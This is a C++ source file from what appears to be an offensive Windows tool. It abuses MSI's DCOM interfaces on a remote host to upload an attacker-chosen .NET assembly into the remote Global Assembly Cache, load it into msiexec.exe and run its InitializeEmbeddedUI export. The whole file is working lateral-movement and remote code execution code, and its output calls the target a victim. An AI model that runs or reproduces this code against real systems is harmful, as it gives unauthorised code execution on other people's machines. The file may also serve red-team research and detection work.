#include "Includes.h"
#include "PayloadConfig.h"

GUID CLSID_MsiServer = { 0x000c101c,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} };
GUID IID_IMsiSever = CLSID_MsiServer;
GUID IID_IMsiCustomAction = { 0x000c1025,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} }; // IDB

// parsed from array at rgCLSID
GUID CLSID_MSIRemoteApi = { 0x000c1035,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46} }; // IDB

HRESULT MsiUploadExec(IUnknown* pIMsiServerAuthen, COAUTHINFO* pAuthInfo)
{
	HMODULE hmsi = LoadLibraryA("msi.dll");

	IMsiRemoteAPI* pRemApi = reinterpret_cast<IMsiRemoteAPI*>(ComUtils::CreateObjectFromDllFactory(hmsi, CLSID_MSIRemoteApi));
	const unsigned long fakeRemoteClientPid = 4; // seems like any active pid would do lol
	unsigned long outServerPid = 0;
	const int cookieSize = 16;
	int iRemoteAPICookieSize = cookieSize;
	char rgchCookie[cookieSize];
	IMsiCustomAction* pMsiAction = nullptr;
	

	WCHAR* pvEnvironment = GetEnvironmentStringsW();
	DWORD cEnv = GetEnvironmentSizeW(pvEnvironment);


	// IMsiConfigurationManager is the server side implementation of IMsiServer
	HRESULT msiresult = reinterpret_cast<IMsiConfigurationManager*>(pIMsiServerAuthen)->CreateCustomActionServer(icac64Impersonated, fakeRemoteClientPid, pRemApi, pvEnvironment, cEnv, 0, rgchCookie, &iRemoteAPICookieSize, &pMsiAction, &outServerPid, false);
	if (!pMsiAction)
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << msiresult << L" Calling CreateCustomActionServer. Make sure you are on the same domain/forest with target." << std::endl;
		pIMsiServerAuthen->Release();
		return 0;
	}

	IMsiCustomAction* authedAction = nullptr;
	HRESULT hr = ComUtils::SetupAuthOnParentIUnknownCastToIID(pMsiAction, pAuthInfo, (IUnknown**)&authedAction, IID_IMsiCustomAction);
	if(!authedAction)
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Setting authentication on created IMsiCustomAction" << std::endl;
		pIMsiServerAuthen->Release();
		return -1;
	}

	std::wcout << L"[+] Created an authenticated IMsiCustomAction hosted on MSIEXEC.exe - PID " << outServerPid << std::endl;

	char* outc = nullptr;
	int outi = 0;
	// can be any GUIDs
	LPCWSTR mocGuid1 = L"{13333337-1337-1337-1337-133333333337}";
	LPCWSTR mocGuid2 = L"{13333338-1338-1338-1338-133333333338}";

	
	LPCWSTR asmName = ASSEMBLY_NAME;
	LPCWSTR asmblyPath = PAYLOAD_ASSEMBLY_PATH;
	LPCWSTR asmBitness = ASSEMBLY_BITNESS;
	LPCWSTR asmVersion = ASSEMBLY_VERSION;
	LPCWSTR publicKeyToken = ASSEMBLY_PUBLIC_KEY;

	hr = authedAction->URTAddAssemblyInstallComponent(mocGuid1, mocGuid2, asmName);
	if(FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Calling IMsiCustomAction->URTAddAssemblyInstallComponent" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}
	hr = authedAction->URTGetAssemblyCacheItem(mocGuid1, mocGuid2, 0, &outi, &outc);
	if (FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Calling IMsiCustomAction->URTGetAssemblyCacheItem" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}
	hr = authedAction->URTCreateAssemblyFileStream(asmblyPath, STREAM_FORMAT_COMPLIB_MANIFEST); // can only send STREAM_FORMAT_COMPLIB_MODULE or STREAM_FORMAT_COMPLIB_MANIFEST.
	if (FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Calling IMsiCustomAction->URTCreateAssemblyFileStream" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}

	std::wcout << L"[+] Created a remote GAC file stream" << std::endl;

	
	HANDLE hAsm = CreateFileW(asmblyPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(!hAsm)
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Opening " << asmblyPath << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}
	DWORD asmSize, sizeRead;

	asmSize = GetFileSize(hAsm, NULL);
	if(asmSize == INVALID_FILE_SIZE)
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << GetLastError() << L" Running GetFileSize on " << asmblyPath << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}

	std::unique_ptr<char[]> content = std::make_unique<char[]>(asmSize);

	if(!ReadFile(hAsm, content.get(), asmSize, &sizeRead, NULL))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << GetLastError() << L" Reading " << asmblyPath << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}

	std::wcout << L"[+] Locally processed " << asmblyPath << std::endl;

	ulong written = 0;
	hr = authedAction->URTWriteAssemblyBits(content.get(), asmSize, &written);
	if (FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Calling IMsiCustomAction->URTWriteAssemblyBits" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}

	hr = authedAction->URTCommitAssemblyStream();
	if (FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Calling IMsiCustomAction->URTCommitAssemblyStream" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}

	int outIntCommit = 0;
	char* outCharCommit = nullptr;
	hr = authedAction->URTCommitAssemblies(mocGuid1, &outIntCommit, &outCharCommit);
	if (FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Calling IMsiCustomAction->URTCommitAssemblies" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}
	std::wstring payload_gac_path = std::format(L"C:\\Windows\\Microsoft.NET\\assembly\\GAC_{0}\\{1}\\v4.0_{2}__{3}\\{1}.dll", asmBitness, asmName, asmVersion, publicKeyToken);

	std::wcout << L"[+] Uploaded " << asmblyPath << L" to the remote GAC path: " << payload_gac_path << std::endl;

	hr = authedAction->LoadEmbeddedDLL(payload_gac_path.c_str(), 0);
	if (FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" Calling IMsiCustomAction->LoadEmbeddedDLL" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}

	std::wcout << L"[+] Loaded " << payload_gac_path << L" to the remote MSIEXEC.exe - PID " << outServerPid << std::endl;

	ulong pIntPtr, pRetCode;
	std::string messageToVictim = "Hello from DCOM Upload & Execute";

	hr = authedAction->CallInitDLL(messageToVictim.length(), (PVOID)messageToVictim.c_str(), &pIntPtr, &pRetCode);

	if (FAILED(hr))
	{
		std::wcout << L"[-] ERROR: 0x" << std::hex << hr << L" authedAction->CallInitDLL" << std::endl;
		authedAction->Release();
		pIMsiServerAuthen->Release();
		return -1;
	}

	std::wcout << L"[+] Executed " << payload_gac_path << L"'s InitializeEmbeddedUI export" << std::endl;
	std::wcout << L"[+] InitializeEmbeddedUI returned: " << pRetCode << std::endl;

	authedAction->Release();
	pIMsiServerAuthen->Release();
	return 1;
}
